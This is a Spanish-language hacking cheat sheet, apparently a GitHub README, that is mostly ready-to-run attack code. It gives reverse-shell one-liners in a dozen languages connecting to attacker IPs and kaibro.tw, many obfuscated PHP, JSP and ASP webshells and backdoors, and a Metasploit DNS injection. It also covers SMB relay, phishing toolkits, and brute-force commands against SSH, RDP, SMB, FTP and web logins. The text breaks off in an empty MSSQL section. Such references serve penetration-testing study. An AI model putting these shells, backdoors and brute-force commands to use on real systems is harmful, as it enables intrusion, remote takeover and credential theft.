# Exploiting

1. [DNS](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#dns)
	* [Transferencia de zona](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#transferencia-dns)
	* [Dynamic DNS update injection](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#dynamic-dns-update-injection)
1. [Shells](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#shells)
	* [wrapper](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#wrapper)
	* [Reverse Shells](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#reverse-shells)
	* [Webshells](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#webshells)
	* [Generadores de Reverse Shells](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#generadores-de-reverse-shells)
	* [TTY Spawn](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#tty-spawn)
	* [Meterpreter](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting/Metasploit.md#meterpreter)
1. [Exploits](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#exploits)
	* [Learning](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#learning)
	* [Busqueda de vulnerabilidades](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#busqueda-de-vulnerabilidades)
	* [Busqueda de Exploits](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#busqueda-de-exploits)
	* [Compilando exploits](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#compilando-exploits)
	* [Metasploit](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting/Metasploit.md)
1. [SMB](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#smb)
1. [MySQL](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#mysql)
1. [LDAP](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#ldap)
1. [Cifrados](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#cifrados)
1. [Ingenieria social](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#ingenieria-social)
1. [Fuerza bruta](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#fuerza-bruta)
	* [Passwords por Default](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#passwords-por-default)
	* [Wordlists](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#wordlists)
	* [Reglas de Wordlists](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#reglas-de-wordlists)
	* [Generacion de wordlists](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#generacion-de-wordlists)
	* [Reconocimiento de algoritmos](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#reconocimiento-de-algoritmos)
	* [Decoding](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#decoding)
	* [Password attacks](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#password-attacks)
1. [Analisis de trafico](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#analisis-de-trafico)
	* [Decoders Hex packets](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#decoders-hex-packets)
1. [Web hacking](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#web-hacking)
	* [Reverse Proxys](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#reverse-proxys)
	* [Requests](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#requests)
	* [Bypassing](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#bypassing)
	* [API Keys](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#api-keys)
	* [Logica](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#logica)
	* [Information Disclosure](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#information-disclosure)
	* [Password Reset](https://github.com/HerculesRD/HerculesDocs/blob/main/Exploiting/README.md#funcionalidad-de-password-reset)
	* [Auth](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#auth)
	* [IDOR](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#idor)
	* [File upload](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#file-upload)
	* [SQLi](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#sqli)
	* [XSS](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#xss)
	* [LFI](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#lfi)
	* [RCE](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#rce)
	* [RFI](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#rfi)
	* [Command injection](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#command-injection)
	* [XXE](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#xxe)
	* [HTML Injection](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#html-injection)
	* [HPP](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#hpp)
	* [SSRF](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#)
	* [CRLF](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#crlf)
	* [CSRF](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#csrf)
	* [Open Redirection](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#open-redirection)
	* [HTTP Smuggling](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#http-smuggling)
	* [SSTI](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#ssti)
	* [LRI](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#lri)
	* [JWT](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#jwt)
	* [Deserializacion insegura](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#deserializacion-insegura)
	* [Subdomain Takeover](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#subdomain-takeover)
	* [Web Sockets](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#web-sockets)
1. [VoIP](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#voip)
1. [Redes inalambricas](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#redes-inalambricas)
	* [PMKID clientless WPA/WPA2](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#pmkid-clientless-wpawpa2)
1. [Mobile](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting#mobile)
2. [CCTV]()

# DNS

## Transferencia DNS

### Host
```bash
host -t ns www.url.com #devuelve servers DNS
host -l dns.url.com #transferencia de zona
host -t mx www.url.com #devuelve informacion
```

### DIG
```bash
dig NS www.url.com
dig @dns.url.com axfr www.url.com
```

### fierce
```bash
$fierce -dns url.com
```

## Dynamic DNS update injection
```bash
dig @IP sdexchange.sittingduck.info #hacemos backup de la salida
sudo msfconsole
msf>use auxiliary/admin/dns/dyn_dns_update
msf>set domain sittingduck.info
msf>set hostname sdexchange
msf>set IP x.x.x.x #una ip inventada fuera del dominio a donde apuntara el dominio
msf>set RHOST x.x.x.x #el host de la victima
msf>run
```

# Shells

## Wrapper

[rlwrap Github](https://github.com/hanslub42/rlwrap)

## Reverse Shells

### Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/x.x.x.x/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Bash
```bash
bash -i >& /dev/tcp/10.10.14.13/5555 0>&1
```

```bash
0<&196;exec 196<>/dev/tcp/10.10.14.13/5555; sh <&196 >&196 2>&196
```

### Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.32/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Node.js
```bash
var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(5566, "kaibro.tw", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});

require('child_process').exec("bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'");
```

### Lua
```bash
lua5.1 -e 'local host, port = "192.168.1.2", 4444 local = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### Netcat
```Bash
nc -e /bin/sh 10.0.0.1 1234
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Perl
```bash
perl -e 'use Socket;$i="192.168.1.2";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"4444:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### PHP
```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("192.168.1.2",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("192.168.1.2",4444);system("/bin/sh -i <&3 >&3 2>&3");'
```

Ofuscado
```bash
#Uso: http://target.com/path/to/shell.php?0=command

<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
```

```bash
#Uso: http://target.com/path/to/shell.php?_=function&__=argument
#Ejemplo: http://target.com/path/to/shell.php?_=system&__=ls
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
```

### Powershell
```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.11",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Ofuscado
```bash
python -c $'import base64; IP = "10.10.10.19"; PORT = "7878"; payload = \'$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\' % (IP, int(PORT)); print("powershell -e " + base64.b64encode(payload.encode("utf16")[2:]).decode());'
```

### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
export RHOST="192.168.11";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Pwncat
```bash
pwncat -e '/bin/sh' 10.0.0.1 1234
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.11","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'Powershell
```

### Telnet
```bash
telnet IPatacante 1337 | /bin/bash | telnet IPAtacante 1338

#atacante
nc -lnvp 1337
nc -lnvp 1338
```

### TCLsh
```bash
$echo 'set s [socket 10.10.14.32 1337];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
```

### Xterm
```bash
xterm -display 10.10.14.32:1
Xnest :1
xhost +targetip
```

## Webshells

### Bash
```bash
#Salvar como, por ejemplo, cli.sh
while true;do read -p "[>] :~$ " cmd;curl $1$cmd;done

#Uso: ./cli.sh http://target.com/path/to/shell.php?0=
```

### PHP
```bash
<?php system($_GET["cmd"]); ?>
<?php system($_GET[1]); ?>
<?php system("`$_GET[1]`"); ?>
<?= system($_GET[cmd]);
<?=`$_GET[1]`;
<?php eval($_POST[cmd]);?>
<?php echo `$_GET[1]`;
<?php echo passthru($_GET['cmd']);
<?php echo shell_exec($_GET['cmd']);
<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
<script language="php">system("id"); </script>

<?php $_GET['a']($_GET['b']); ?>
// a=system&b=ls
// a=assert&b=system("ls")

<?php array_map("ass\x65rt",(array)$_REQUEST['cmd']);?>
// .php?cmd=system("ls")

<?@extract($_REQUEST);@die($f($c));?>
// .php?f=system&c=id

<?php @include($_FILES['u']['tmp_name']);  
// <form action="http://x.x.x.x/shell.php" method="POST" enctype="multipart/form-data">
// include
// From: http://www.zeroplace.cn/article.asp?id=906

<?php $x=~Â¾Â¬Â¬ÂºÂ­Â«;$x($_GET['a']); ?>
// not backdoor (assert)
// .php?a=system("ls")

echo "{${phpinfo()}}";

echo "${system(ls)}";

echo Y2F0IGZsYWc= | base64 -d | sh
// Y2F0IGZsYWc=   =>  cat  flag

echo -e "<?php passthru(\$_POST[1])?>;\r<?php echo 'A PHP Test ';" > shell.php
// cat shell.php
// <?php echo 'A PHP Test ';" ?>

echo ^<?php eval^($_POST['a']^); ?^> > a.php
// Windows echo 

<?php fwrite(fopen("gggg.php","w"),"<?php system(\$_GET['a']);");

<?php
header('HTTP/1.1 404');
ob_start();
phpinfo();
ob_end_clean();
?>

<?php 
// e.g. ?pass=file_get_contents('http://kaibro.tw/test')
ob_start('assert');
echo $_REQUEST['pass'];
ob_end_flush();
?>

<?=
// webshell
$ðŸ’© = '[[[[@@' ^ '("(/%-';
$ðŸ’©(('@@['^'#!/')." /????");


A=fl;B=ag;cat $A$B
```

```bash
<?php echo system($_GET["cmd"]); ?>
```

```bash
<?php echo passthru($_GET['cmd']); ?>
```

```bash
<?=`$_GET[0]`?>
```

#### PHP con weevely
```bash
#Genera PHP backdroor con una password dada
$weevely generate s3cr3t

#Conectar a la webshell subida con la url y la password
$weevely http://10.10.10.9/weevely.php s3cr3t
```

[Github Weevely](https://github.com/epinna/weevely3)

## Generadores de Reverse Shells

### Weibel

[Link](https://weibell.github.io/reverse-shell-generator/)

### Shellerator
```bash
shellerator #suite
```

[Github Shellerator](https://github.com/ShutdownRepo/shellerator)

## TTY Spawn

### Bash
```bash
/bin/bash -i
```

### Echo
```bash
echo os.system('/bin/bash')
```

### Lua
```bash
lua: os.execute('/bin/sh')
```

### Perl
```bash
perl -e 'exec "/bin/sh":'
```

```bash
perl: exec "/bin/sh";
```

### Python
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Ruby
```bash
ruby: exec "/bin/sh";
```

### JSP
```bash
<%Runtime.getRuntime().exec(request.getParameter("i"));%>
```

```bash
<%
if("kaibro".equals(request.getParameter("pwd"))) {
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
}
%>
```

### Unicode
```
<%\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u002E\u0067\u0065\u0074\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u0028\u0029\u002E\u0065\u0078\u0065\u0063\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006D\u0065\u0074\u0065\u0072\u0028\u0022\u0069\u0022\u0029\u0029\u003B%>
```

### JSPX
```bash
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"
  version="1.2">
<jsp:directive.page contentType="text/html"/>
<jsp:declaration>
</jsp:declaration>
<jsp:scriptlet>
Runtime.getRuntime().exec(request.getParameter("i"));
</jsp:scriptlet>
<jsp:text>
</jsp:text>
</jsp:root>
```

### CP037
```bash
Lo%C2%A7%C2%94%C2%93@%C2%A5%C2%85%C2%99%C2%A2%C2%89%C2%96%C2%95~%7F%C3%B1K%C3%B0%7F@%C2%85%C2%95%C2%83%C2%96%C2%84%C2%89%C2%95%C2%87~%7F%C2%83%C2%97%C3%B0%C3%B3%C3%B7%7Fon%25L%C2%91%C2%A2%C2%97z%C2%99%C2%96%C2%96%C2%A3@%C2%A7%C2%94%C2%93%C2%95%C2%A2z%C2%91%C2%A2%C2%97~%7F%C2%88%C2%A3%C2%A3%C2%97zaa%C2%91%C2%81%C2%A5%C2%81K%C2%A2%C2%A4%C2%95K%C2%83%C2%96%C2%94a%C3%91%C3%A2%C3%97a%C3%97%C2%81%C2%87%C2%85%7F%25@@%C2%A5%C2%85%C2%99%C2%A2%C2%89%C2%96%C2%95~%7F%C3%B1K%C3%B2%7Fn%25L%C2%91%C2%A2%C2%97z%C2%84%C2%89%C2%99%C2%85%C2%83%C2%A3%C2%89%C2%A5%C2%85K%C2%97%C2%81%C2%87%C2%85@%C2%83%C2%96%C2%95%C2%A3%C2%85%C2%95%C2%A3%C3%A3%C2%A8%C2%97%C2%85~%7F%C2%A3%C2%85%C2%A7%C2%A3a%C2%88%C2%A3%C2%94%C2%93%7Fan%25L%C2%91%C2%A2%C2%97z%C2%84%C2%85%C2%83%C2%93%C2%81%C2%99%C2%81%C2%A3%C2%89%C2%96%C2%95n%25La%C2%91%C2%A2%C2%97z%C2%84%C2%85%C2%83%C2%93%C2%81%C2%99%C2%81%C2%A3%C2%89%C2%96%C2%95n%25L%C2%91%C2%A2%C2%97z%C2%A2%C2%83%C2%99%C2%89%C2%97%C2%A3%C2%93%C2%85%C2%A3n%25%C3%99%C2%A4%C2%95%C2%A3%C2%89%C2%94%C2%85K%C2%87%C2%85%C2%A3%C3%99%C2%A4%C2%95%C2%A3%C2%89%C2%94%C2%85M%5DK%C2%85%C2%A7%C2%85%C2%83M%C2%99%C2%85%C2%98%C2%A4%C2%85%C2%A2%C2%A3K%C2%87%C2%85%C2%A3%C3%97%C2%81%C2%99%C2%81%C2%94%C2%85%C2%A3%C2%85%C2%99M%7F%C2%89%7F%5D%5D%5E%25La%C2%91%C2%A2%C2%97z%C2%A2%C2%83%C2%99%C2%89%C2%97%C2%A3%C2%93%C2%85%C2%A3n%25L%C2%91%C2%A2%C2%97z%C2%A3%C2%85%C2%A7%C2%A3n%25La%C2%91%C2%A2%C2%97z%C2%A3%C2%85%C2%A7%C2%A3n%25La%C2%91%C2%A2%C2%97z%C2%99%C2%96%C2%96%C2%A3n%25
```

### EL
```bash
${Runtime.getRuntime().exec("touch /tmp/pwned")}
```

### ASP
```bash
<%eval request("kaibro")%>

<%execute request("kaibro")%>

<%ExecuteGlobal request("kaibro")%>

<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

### ASPX
```bash
<%@ Page Language="Jscript"%><%eval(Request.Item["kaibro"],"unsafe");%>
```
```bash
<%if (Request.Files.Count!=0){Request.Files[0].SaveAs(Server.MapPath(Request["f"]));}%>
```

## Meterpreter

[Link](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting/Metasploit.md#meterpreter)

# Exploits

## Learning

### Hacksplaining

Explica como funcionan las vulnerabilidades mas comunes

[Link](https://www.hacksplaining.com/lessons)

## Busqueda de vulnerabilidades

* [NVD](https://nvd.nist.gov/vuln/search)
* [Mitre](http://cve.mitre.org/)
* [vuldb](https://vuldb.com/es/)
* [Synk](https://snyk.io/vuln)
* [CVEDetails](https://www.cvedetails.com/)

## Busqueda de Exploits

* [sploitus](https://sploitus.com)
* [ExploitAlert](https://exploitalert.com/index.html)
* [exFinder (ExploitSearch por terminal)][https://github.com/HerculesRD/exFinder]
* [ExploitDB](www.exploit-db.com)
* [0day today](https://0day.today/)

### searchsploit (igual que exploitdb)
```bash
searchsploit ejemplo
searchsploit -x exploits/windows/exploitAExaminar
searchsploit -m exploits/windows/exploitACopiar
```

## Compilando exploits

### C/C++
```bash
gcc -o exploit exploit.c
gcc -o exploit exploit.c -m32 #32bits
```

```bash
g++ -o exploit exploit.cpp
```

O si necesitamos hacerlo .exe
```bash
$i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```

## Metasploit

[Link](https://github.com/HerculesRD/HerculesDocs/tree/main/Exploiting/Metasploit.md)

# SMB

## Conectar

### SMBClient
```bash
smbclient -L \\IP\path
```

```bash
smbclient -L \\IP\path -U '' -N #null session
```

### SMBMap
```bash
smbmap -u "Administrator" -p "Pass123" -H 10.10.10.19 #tambien se puede pasar hash NTLM
```

### CrackmapExec
```bash
crackmapexec smb 10.10.10.19 -u '' -p '' --shares #Null user
```

```bash
crackmapexec smb 10.10.10.19 -u 'Administrator' -p 'Pass123' --shares
```

## Montando Shares

Anonymous Login
```bash
mount -t cifs '//x.x.x.x/Sharename' /mount_location
```

```bash
mount -t cifs -o 'username=admin,password=admin' '//x.x.x.x/Sharename' /mount_location
```

## SMB Relay Attack
```bash
./smbAutoRelay.sh -i eth0 -t ./targets.txt
```

[smbautorelay Github](https://github.com/cheshire-ca/smbAutoRelay)

# MySQL

## Conectar
```bash
mysql -h IP -u root -p
```

## Post Conexion
```bash
\! /bin/sh #pops shell (just try)
```

```bash
select * from tables;
select * from nombre_tabla; #enumerar valores de table
```

# LDAP

## LDAPSearch
```bash
ldapsearch -x -h 10.10.10.19 -D 'dev.corp\Administrator' -w 'Pass123' <OPTION>

#Extract Users
-b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Computers
-b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract My info
-b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Domain Admins
-b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Domain Users
-b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Enterprise Admins
-b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Administrators
-b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>"
#Extract Remote Desktop Group
-b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>"
```

# Cifrados

## RSA

### Ataque Wiener
```bash
python3 RsaCtfTool.py --publickey key.pub --uncipherfile file.enc
```

# Ingenieria social

## Setoolkit
```bash
setoolkit #suite
```

## Hidden
```bash
HiddenEye #suite
```

## advphishing
```bash
advphishing #suite
```

## Fake mailer

[Emkei link](https://emkei.cz/)

# Fuerza Bruta

## Passwords por Default

### Routers

[Router Passwords Link](routerpasswords.com)

## Wordlists

### Weakpass

[Weakpass Link](https://weakpass.com/wordlist)

### Kaonashi

[Kaonashi Link](https://github.com/kaonashi-passwords/Kaonashi)

### Seclist

[Seclist Link](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

## Reglas de Wordlists

### NSA Rules

[nsa-rules link](https://github.com/NSAKEY/nsa-rules)

### Not to secure

[Link](https://github.com/NotSoSecure/password_cracking_rules)

### Kaonashi

[Link](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)

## Generacion de wordlists

### Cewl
```bash
cewl www.url.com #wordlist
cewl -m 10 #longitud
cewl -e #colecta los emails
cewl -n #no words
cewl -c #mostrar cuantas veces se repite cada palabra
cewl -d 3 #nivel de profundidad
cewl --with-numbers #con numeros
cewl -w output.txt
cewl --allowed #REGEX only
```

### Crunch
```bash
crunch min_len max_len -o output.txt
crunch 1 3 -o out.txt

crunch 1 3 asd
#a
#s
#d
#as

crunch 3 3 -t as@ 
#MinÃºscula - asa - asb
crunch 3 3 -t as,
#MayÃºscula - asA - asB
crunch 3 3 -t as%
#Num - as0 - as1
crunch 3 3 -t as^
#sÃ­mbolo - as! - as"
crunch 3 3 -p hola chau pepe
#ignora el min y maximo, mezcla las palabras
#holachaupepe - chauholapepe
crunch 3 3 -b 100mb -o START
#particiona en wordlists de 100mb
crunch 3 3 -d 2@
#limita la cantidad de minusculas iguales consecutivas a 2
```

### Combinar wordlists

path por default en Kali
Combina wordlists sin repetir palabras
```bash
/usr/lib/hashcat-utils/combinator3.bin file1 file2 file3
```

### Generadores inteligentes

* [String2Pwn](https://threatintel.xyz/string2pwd/)

#### Bopscrk
```bash
Bopscrk -i #interactive
```

[bopscrk Github](https://github.com/r3nt0n/bopscrk)

#### CUPP
```bash
cupp #interactivo
```

[CUPP Github](https://github.com/Mebus/cupp)

#### BEWGor
```bash
BEWGor #interactivo
```

[BEWGor github](https://github.com/berzerk0/BEWGor)

## Reconocimiento de algoritmos

### OnlineHashCrack

[Link](https://www.onlinehashcrack.com/hash-identification.php)

### MD5Hashing

[Link](https://md5hashing.net/hash_type_checker)

### hash-identifier
```bash
hash-identifier #interactivo
```

## Decoding

### Cyberchef

encoding, compression, data analysis
[Link](http://icyberchef.com/)

### dCode

Para algoritmos mas raros y deciphers

[Link](https://www.dcode.fr)

### Calculadora Cesar

[Link](https://es.planetcalc.com/1434/?license=1&language_select=es)

### Cracking online

[crackstation](https://crackstation.net/)
[md5decrypt](https://md5decrypt.net/en/)

## Password attacks

### Offline

#### John The Ripper
```bash
john --wordlist="wordlist.lst" hash.txt
```

#### Hashcat
```bash
$hashcat -m hashType -a attackMode hash.txt ?a?a?a
#ejemplo
$hashcat -m 0 -a 3 hash.txt ?l?u?d

#Attack types
#0 Diccionario
#1 Combinacion
#3 fuerza bruta (patrones)

#patrones
#?l - MinÃºsculas
#?u - MayÃºsculas
#?d - NÃºmeros
#?h - NÃºmeros y minÃºsculas
#?H - NÃºmeros y mayÃºsculas
#?s - SÃ­mbolos
#?a - Min-may-num-sim
#?b - 0x00-0xff
```

### SMB Bruteforce
```bash
acccheck -t IP -u user -P wordlist.lst
```

```bash
hydra -t 1 -l user -P wordlist.lst IP smb
```

```bash
medusa medusa -h 192.168.1.2 -u admin -P wordlist.lst -M smbnt
```

```bash
crackmapexec smb x.x.x.x -u user.txt -p pass.txt --shares --continue-on-success
```

```bash
potator smb_login host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE
```

### SNMP Bruteforce
```bash
hydra -P wordlist.lst IP snmp
```

### FTP Bruteforce
```bash
hydra  -t 1 -l admin -P wordlist.lst IP ftp
```

```bash
potator ftp_login host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt -x ignore:mesg='Login incorrect.'
```

Encontrar logins anonimos en subred
```bash
potator ftp_login host=NET0 user=anonymous password=test@example.com 0=10.0.0.0/24
```

### SSH Bruteforce
```bash
hydra -l admin -P wordlist.lst IP ssh
```

```bash
ncrack --user user IP:22
```

```bash
medusa medusa -h 192.168.1.2 -u admin -P wordlist.lst -M ssh
```

```bash
patator ssh_login host=192.168.60.50 user=FILE0 password=FILE1 0=/root/username 1=/root/wordlist.txt -x ignore:mesg=â€™Authentication failedâ€™
```

### POP3 Bruteforce
```bash
hydra -l user -P wordlist.lst IP pop3 -f #con -f salis desp del primer exito
```

```bash
hydra -P wordlist.lst IP smtp
```

### HTTP GET Login Bruteforce
```bash
hydra -l user -P wordlist.lst IP http-get /admin
```

```bash
medusa medusa -h 192.168.1.2 -u admin -P wordlist.lst -M http
```

```bash
potator http_fuzz url=http://10.0.0.1/manager/html user_pass=FILE0:FILE0 0=logins.txt -x ignore:code=401
```

### HTTP POST Bruteforce
```bash
hydra -l user -P wordlist.lst IP http-form-post '/admin:user=^USER^&password=^PASS^:L=Login successful'
```

```bash
potator http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST follow=1 accept_cookie=1 body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt -x ignore:fgrep='Cannot log in to the MySQL server'
```

### RDP Bruteforce
```bash
hydra -t 1 -f -l user -P wordlist.lst rdp://IP
```

```bash
ncrack --user user -P wordlist.lst IP:3389
```

### MySQL
```bash
potator mysql_login host=10.0.0.1 user=FILE0 password=FILE0 0=logins.txt -x ignore:fgrep='Access denied for user'
```

### MSSQL Bruteforce
```bash
